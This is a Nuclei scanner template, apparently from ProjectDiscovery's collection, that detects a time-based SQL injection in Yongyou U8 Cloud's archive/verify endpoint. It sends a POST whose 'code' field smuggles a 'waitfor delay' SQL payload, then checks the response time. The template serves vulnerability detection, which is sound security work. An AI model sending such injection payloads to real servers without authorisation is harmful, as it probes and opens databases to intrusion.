id: yongyou-u8-cloud-archive-verify-sqli
info:
  name: Yongyou U8 Cloud archive_verify SQL Injection Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 1}}"

http:
  - raw:
      - |
        POST /u8cuapws/rest/archive/verify HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {"orgInfo":{"code":"1';waitfor delay '0:0:{{t1}}'--"}}

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\"code\":\"9999\""
          - "\"success\":false"
        part: body

      - type: dsl
        dsl:
          - "status_code == 200"
          - "duration > to_number(t1)"
          - "duration < to_number(t2)"
